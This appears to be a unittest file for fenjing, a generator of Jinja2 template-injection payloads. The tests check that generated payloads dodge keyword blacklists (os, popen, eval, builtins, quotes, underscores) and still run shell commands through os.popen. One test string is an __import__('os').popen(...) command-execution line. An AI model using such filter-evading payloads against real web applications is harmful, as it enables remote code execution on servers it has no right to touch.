import sys  # noqa

sys.path.append("..")  # noqa

import fenjing
import logging
from fenjing import FullPayloadGen, const
import unittest
import jinja2
import random

fenjing.full_payload_gen.logger.setLevel(logging.ERROR)
fenjing.payload_gen.logger.setLevel(logging.ERROR)
logging.basicConfig(level=logging.INFO)


def get_full_payload_gen(
    blacklist, detect_mode=fenjing.const.DETECT_MODE_ACCURATE
):
    return FullPayloadGen(
        lambda x: all(word not in x for word in blacklist),
        detect_mode=detect_mode,
    )


class FullPayloadGenTestCaseSimple(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "[",
            "]",
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            payload, _ = self.full_payload_gen.generate(const.STRING, string)
            # self.assertIsNotNone(payload)
            assert payload is not None
            # why?
            # cause the stupid type checker thinks the 'payload' below would still be None
            result = jinja2.Template(payload).render()
            self.assertIn(string, result)
            for word in self.blacklist:
                self.assertNotIn(word, payload)

    def test_os_popen_read(self):
        payload, _ = self.full_payload_gen.generate(
            const.OS_POPEN_READ, "echo fen  jing;"
        )
        # self.assertIsNotNone(payload)
        assert payload is not None
        # why?
        # cause the stupid type checker thinks the 'payload' below would still be None
        result = jinja2.Template(payload).render()
        self.assertIn("fen jing", result)
        for word in self.blacklist:
            self.assertNotIn(word, payload)


class FullPayloadGenTestCaseHard(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "config",
            "self",
            "g",
            "os",
            "class",
            "length",
            "mro",
            "base",
            "lipsum",
            "[",
            '"',
            "'",
            "_",
            ".",
            "+",
            "~",
            "{{",
            "0",
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "０",
            "１",
            "２",
            "３",
            "４",
            "５",
            "６",
            "７",
            "８",
            "９",
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            payload, _ = self.full_payload_gen.generate(const.STRING, string)
            # self.assertIsNotNone(payload)
            assert payload is not None
            # why?
            # cause the stupid type checker thinks the 'payload' below would still be None
            result = jinja2.Template(payload).render()
            self.assertIn(string, result)
            for word in self.blacklist:
                self.assertNotIn(word, payload)

    def test_os_popen_read(self):
        payload, _ = self.full_payload_gen.generate(
            const.OS_POPEN_READ, "echo fen  jing;"
        )
        # self.assertIsNotNone(payload)
        assert payload is not None
        # why?
        # cause the stupid type checker thinks the 'payload' below would still be None
        result = jinja2.Template(payload).render()
        self.assertIn("fen jing", result)
        for word in self.blacklist:
            self.assertNotIn(word, payload)


class FullPayloadGenTestCaseHard2(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "_",
            "'",
            '"',
            ".",
            "system",
            "os",
            "eval",
            "exec",
            "popen",
            "subprocess",
            "posix",
            "builtins",
            "namespace",
            "open",
            "read",
            "\\",
            "self",
            "mro",
            "base",
            "global",
            "init",
            "/",
            "00",
            "chr",
            "value",
            "get",
            "url",
            "pop",
            "import",
            "include",
            "request",
            "{{",
            "}}",
            '"',
            "config",
            "=",
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            payload, _ = self.full_payload_gen.generate(const.STRING, string)
            # self.assertIsNotNone(payload)
            assert payload is not None
            # why?
            # cause the stupid type checker thinks the 'payload' below would still be None
            result = jinja2.Template(payload).render()
            self.assertIn(string, result)
            for word in self.blacklist:
                self.assertNotIn(word, payload)

    def test_os_popen_read(self):
        payload, _ = self.full_payload_gen.generate(
            const.OS_POPEN_READ, "echo fen  jing;"
        )
        # self.assertIsNotNone(payload)
        assert payload is not None
        # why?
        # cause the stupid type checker thinks the 'payload' below would still be None
        result = jinja2.Template(payload).render()
        self.assertIn("fen jing", result)

        for word in self.blacklist:
            self.assertNotIn(word, payload)


class FullPayloadGenTestCaseRandom(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.blacklists = [
            random.sample(
                [
                    "config",
                    "self",
                    "g",
                    "os",
                    "class",
                    "length",
                    "mro",
                    "base",
                    "lipsum",
                    "[",
                    '"',
                    "'",
                    "_",
                    ".",
                    "+",
                    "~",
                    "{{",
                    "0",
                    "1",
                    "2",
                    "3",
                    "4",
                    "5",
                    "6",
                    "7",
                    "8",
                    "9",
                    "０",
                    "１",
                    "２",
                    "３",
                    "４",
                    "５",
                    "６",
                    "７",
                    "８",
                    "９",
                ],
                k=25,
            )
            for _ in range(50)
        ]
        self.full_payload_gens = [
            get_full_payload_gen(
                blacklist,
                detect_mode=random.choice(
                    [
                        fenjing.const.DETECT_MODE_ACCURATE,
                        fenjing.const.DETECT_MODE_FAST,
                    ]
                ),
            )
            for blacklist in self.blacklists
        ]

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for g, blacklist in zip(self.full_payload_gens, self.blacklists):
            for string in strings:
                payload, _ = g.generate(const.STRING, string)
                # self.assertIsNotNone(payload)
                assert payload is not None
                # why?
                # cause the stupid type checker thinks the 'payload' below would still be None
                result = jinja2.Template(payload).render()
                self.assertIn(string, result)
                for word in blacklist:
                    self.assertNotIn(word, payload)

    def test_os_popen_read(self):
        for g, blacklist in zip(self.full_payload_gens, self.blacklists):
            payload, _ = g.generate(const.OS_POPEN_READ, "echo fen  jing;")
            # self.assertIsNotNone(payload)
            assert payload is not None
            # why?
            # cause the stupid type checker thinks the 'payload' below would still be None
            result = jinja2.Template(payload).render()
            self.assertIn("fen jing", result)
            for word in blacklist:
                self.assertNotIn(word, payload)
